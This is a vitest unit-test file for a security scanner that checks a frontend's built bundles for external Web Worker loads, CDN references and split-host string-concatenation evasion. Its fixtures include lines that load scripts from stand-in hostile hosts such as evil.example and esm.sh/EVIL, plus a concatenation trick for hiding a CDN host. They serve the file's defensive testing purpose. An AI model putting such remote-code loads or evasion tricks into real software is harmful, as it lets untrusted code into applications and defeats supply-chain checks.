// WP-KERNEL-009 / MT-027 — FrontendWorkerBundling scanner unit proof.
//
// The full check (`pnpm run check:worker-bundling`,
// app/scripts/check-worker-bundling.mjs) performs the REAL builds and scans
// app/dist + app/dist-harness. This vitest proves the scanner primitives
// themselves are alive — they catch external worker loads and CDN hits in
// negative fixtures, and they do NOT flag the two known benign shapes
// (relative bundled worker URLs; doc-comment URLs near a worker call, e.g.
// the MDN links TypeScript ships inside ts.worker.js).
//
// The built_output_scan_exceptions mechanism (runtime dependency allowlist,
// MT-017 authority) is also pinned here: an exception applies ONLY when its
// required_context_marker sits within max_marker_distance of the hit, so the
// excalidraw ASSETS_FALLBACK_URL exemption cannot widen to arbitrary esm.sh
// references.

import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import {
  assertSingleOccurrenceExceptions,
  externalWorkerLoads,
  loadAllowlist,
  normalizeSplitHostLiterals,
  partitionCdnHits,
  scanSplitHostCdn,
} from "../../../scripts/lib/dependency_policy_scans.mjs";
import { scanWorkerBundleTree } from "../../../scripts/lib/worker_bundling_scan.mjs";

const repoRoot = join(dirname(fileURLToPath(import.meta.url)), "..", "..", "..", "..");
const allowlist = loadAllowlist(repoRoot);

const cdnPatterns = allowlist.forbidden_runtime_dependency_classes
  .find((c) => c.id === "cdn_runtime_asset")!
  .source_scan_patterns.map((p) => p.toLowerCase());

describe("MT-027 external worker-load detection", () => {
  it("catches literal external worker loads in all three call shapes", () => {
    const fixture = [
      'const a = new Worker("https://evil.example/worker.js");',
      "const b = new SharedWorker('http://evil.example/shared.js');",
      'importScripts("https://cdn.evil.example/lib.js");',
      'const c = new Worker(new URL("https://evil.example/u.js"));',
    ].join("\n");
    const violations = externalWorkerLoads(fixture, "fixture.js");
    expect(violations).toHaveLength(4);
    expect(violations.map((v) => v.url)).toEqual([
      "https://evil.example/worker.js",
      "http://evil.example/shared.js",
      "https://cdn.evil.example/lib.js",
      "https://evil.example/u.js",
    ]);
  });

  it("does not flag bundled-local worker loads or nearby doc URLs", () => {
    const fixture = [
      // The only allowed product shape (Vite ?worker output):
      'const w = new Worker(new URL("./assets/ts.worker-IG6bqgZr.js", import.meta.url));',
      // TypeScript's ts.worker.js ships MDN doc links near importScripts
      // mentions — documentation strings, not loads:
      '{ name: "importScripts", doc: "See https://developer.mozilla.org/docs/Web/API/WorkerGlobalScope/importScripts" },',
      "importScripts(localPath);",
    ].join("\n");
    expect(externalWorkerLoads(fixture, "fixture.js")).toHaveLength(0);
  });
});

describe("MT-027 CDN-hit partitioning with self-verifying exceptions", () => {
  it("flags CDN hosts in built output (tripwire is alive)", () => {
    const { violations, exempted } = partitionCdnHits({
      content: 'fetch("https://cdn.jsdelivr.net/npm/monaco-editor/min/vs/loader.js")',
      relPath: "app/dist/assets/fixture.js",
      pattern: "cdn.jsdelivr.net",
      allowlist,
    });
    expect(violations).toHaveLength(1);
    expect(exempted).toHaveLength(0);
  });

  it("exempts esm.sh ONLY next to the excalidraw ASSETS_FALLBACK_URL marker", () => {
    const marked = partitionCdnHits({
      content: 'Y(vW,"ASSETS_FALLBACK_URL",`https://esm.sh/${pkg}/dist/prod/`);',
      relPath: "app/dist/assets/index-fixture.js",
      pattern: "esm.sh",
      allowlist,
    });
    expect(marked.violations).toHaveLength(0);
    expect(marked.exempted).toHaveLength(1);
    expect(marked.exempted[0].dependency).toBe("@excalidraw/excalidraw");

    const unmarked = partitionCdnHits({
      content: 'import("https://esm.sh/some-package@1.0.0");',
      relPath: "app/dist/assets/index-fixture.js",
      pattern: "esm.sh",
      allowlist,
    });
    expect(unmarked.violations).toHaveLength(1);
    expect(unmarked.exempted).toHaveLength(0);
  });

  it("keeps every documented exception fully justified in the allowlist", () => {
    for (const exc of allowlist.built_output_scan_exceptions ?? []) {
      expect(exc.reason.length).toBeGreaterThan(40);
      expect(exc.required_context_marker.length).toBeGreaterThan(0);
      expect(exc.max_marker_distance).toBeLessThanOrEqual(1000);
      expect(exc.mt).toMatch(/^MT-\d{3}$/);
    }
  });
});

// H1 — proximity-window evasion: a 2nd hostile esm.sh planted near the marker.
describe("MT-027 H1 esm.sh single-occurrence whitelist (proximity-window evasion closed)", () => {
  it("tightens the esm.sh exception to forward-only with a small window", () => {
    const exc = (allowlist.built_output_scan_exceptions ?? []).find((e) => e.pattern === "esm.sh");
    expect(exc).toBeTruthy();
    expect(exc!.forward_only).toBe(true);
    expect(exc!.max_marker_distance).toBeLessThanOrEqual(64);
    expect(exc!.max_total_occurrences).toBe(1);
  });

  it("forward-only window does NOT exempt a 2nd esm.sh placed AFTER the marker (evasion case)", () => {
    // The reviewer's evasion: a hostile import 200 chars past the marker. With a
    // forward-only 64-char window the marker can no longer reach forward to it.
    const filler = "x".repeat(200);
    const content = `Y(yW,"ASSETS_FALLBACK_URL",\`https://esm.sh/pkg/\`);${filler}import("https://esm.sh/EVIL");`;
    const { violations, exempted } = partitionCdnHits({
      content,
      relPath: "app/dist/assets/evil.js",
      pattern: "esm.sh",
      allowlist,
    });
    // The legitimate one (marker precedes within 64) is exempted; the hostile
    // one (no preceding marker within 64) is a violation.
    expect(exempted).toHaveLength(1);
    expect(violations).toHaveLength(1);
    expect(violations[0].pattern).toBe("esm.sh");
  });

  it("single-occurrence cap FAILS when esm.sh appears more than once across the dist tree", () => {
    // Even if BOTH occurrences sat next to a marker, the tree-level cap rejects
    // them: there may be at most ONE esm.sh in the whole product dist.
    const files = [
      {
        relPath: "app/dist/assets/index.js",
        content: 'Y(yW,"ASSETS_FALLBACK_URL",`https://esm.sh/legit/`);',
      },
      {
        relPath: "app/dist/assets/evil-chunk.js",
        content: 'const x = await import("https://esm.sh/EVIL@1");',
      },
    ];
    const { perPattern, violations } = assertSingleOccurrenceExceptions({ files, allowlist });
    const esm = perPattern.find((p) => p.pattern === "esm.sh")!;
    expect(esm.count).toBe(2);
    expect(esm.ok).toBe(false);
    expect(violations).toHaveLength(1);
    expect(violations[0].dependency).toBe("@excalidraw/excalidraw");
  });

  it("single-occurrence cap PASSES on the real one-esm.sh shape", () => {
    const files = [
      {
        relPath: "app/dist/assets/index.js",
        content: 'Y(yW,"ASSETS_FALLBACK_URL",`https://esm.sh/${pkg}/dist/`);',
      },
    ];
    const { perPattern, violations } = assertSingleOccurrenceExceptions({ files, allowlist });
    expect(perPattern.find((p) => p.pattern === "esm.sh")!.count).toBe(1);
    expect(violations).toHaveLength(0);
  });

  it("the REAL app/dist has exactly one esm.sh (single-occurrence cap satisfied)", () => {
    const indexFile = join(repoRoot, "app", "dist", "assets", "index-CsHVxNuj.js");
    let content = "";
    try {
      content = readFileSync(indexFile, "utf8");
    } catch {
      content = "";
    }
    if (content.length === 0) {
      // dist not built in this environment — the full check covers the real tree.
      return;
    }
    const { perPattern, violations } = assertSingleOccurrenceExceptions({
      files: [{ relPath: "app/dist/assets/index.js", content }],
      allowlist,
    });
    expect(perPattern.find((p) => p.pattern === "esm.sh")!.count).toBe(1);
    expect(violations).toHaveLength(0);
  });
});

// H4 — split-host string-concatenation evasion in built output.
describe("MT-027 H4 split-host CDN evasion (string-concatenation normalization)", () => {
  it("normalization collapses adjacent string literals so the host re-forms", () => {
    expect(normalizeSplitHostLiterals('"https://cdn." + "jsdelivr.net"')).toContain(
      "cdn.jsdelivr.net",
    );
    // 3-part split must fully re-form too.
    expect(normalizeSplitHostLiterals('"https://cdn." + "js" + "delivr.net"')).toContain(
      "cdn.jsdelivr.net",
    );
  });

  it("catches a split-host CDN literal that the raw substring scan misses (evasion case)", () => {
    const evasive = 'const base = "https://cdn." + "jsdelivr.net" + "/npm/x";';
    // Raw literal scan over the un-normalized text sees no contiguous host:
    const { violations: rawViolations } = partitionCdnHits({
      content: evasive,
      relPath: "app/dist/assets/evasive.js",
      pattern: "cdn.jsdelivr.net",
      allowlist,
    });
    expect(rawViolations).toHaveLength(0);
    // The split-host pass catches it:
    const hits = scanSplitHostCdn({
      content: evasive,
      relPath: "app/dist/assets/evasive.js",
      patterns: cdnPatterns,
    });
    expect(hits.length).toBeGreaterThanOrEqual(1);
    expect(hits[0].pattern).toBe("cdn.jsdelivr.net");
    expect(hits[0].kind).toBe("split-host-concatenation");
  });

  it("does not double-report a host already present as a contiguous substring", () => {
    // A normal contiguous CDN literal is the literal-scan's job, not H4's; H4
    // reports only the evasion (split) cases to avoid duplicate failures.
    const contiguous = 'fetch("https://cdn.jsdelivr.net/npm/x")';
    const hits = scanSplitHostCdn({
      content: contiguous,
      relPath: "app/dist/assets/normal.js",
      patterns: cdnPatterns,
    });
    expect(hits).toHaveLength(0);
  });
});

describe("MT-235 Monaco worker offline fixture", () => {
  function withFixtureDist(files: Record<string, string>, run: (distDir: string) => void) {
    const distDir = mkdtempSync(join(tmpdir(), "hsk-worker-dist-"));
    try {
      for (const [relPath, content] of Object.entries(files)) {
        const fullPath = join(distDir, relPath);
        mkdirSync(dirname(fullPath), { recursive: true });
        writeFileSync(fullPath, content, "utf8");
      }
      run(distDir);
    } finally {
      rmSync(distDir, { recursive: true, force: true });
    }
  }

  it("fails closed when a Monaco bundle is missing one required local worker chunk", () => {
    withFixtureDist(
      {
        "assets/index.js": "globalThis.MonacoEnvironment = {};",
        "assets/editor.worker-a.js": "",
        "assets/ts.worker-a.js": "",
        "assets/json.worker-a.js": "",
        "assets/css.worker-a.js": "",
      },
      (distDir) => {
        const tree = scanWorkerBundleTree(distDir, allowlist);
        expect(tree.bundles_monaco).toBe(true);
        expect(tree.worker_chunks).toEqual([
          "assets/css.worker-a.js",
          "assets/editor.worker-a.js",
          "assets/json.worker-a.js",
          "assets/ts.worker-a.js",
        ]);
        expect(tree.missing_monaco_workers).toEqual(["html"]);
      },
    );
  });

  it("accepts the required bundled-local Monaco worker chunks with zero external loads", () => {
    withFixtureDist(
      {
        "assets/index.js":
          'globalThis.MonacoEnvironment = { getWorker(){ return new Worker(new URL("./ts.worker-a.js", import.meta.url)); } };',
        "assets/editor.worker-a.js": "",
        "assets/ts.worker-a.js": "",
        "assets/json.worker-a.js": "",
        "assets/css.worker-a.js": "",
        "assets/html.worker-a.js": "",
      },
      (distDir) => {
        const tree = scanWorkerBundleTree(distDir, allowlist);
        expect(tree.bundles_monaco).toBe(true);
        expect(tree.missing_monaco_workers).toEqual([]);
        expect(tree.external_worker_refs).toEqual([]);
        expect(tree.cdn_hits).toEqual([]);
        expect(tree.split_host_cdn_hits).toEqual([]);
      },
    );
  });
});
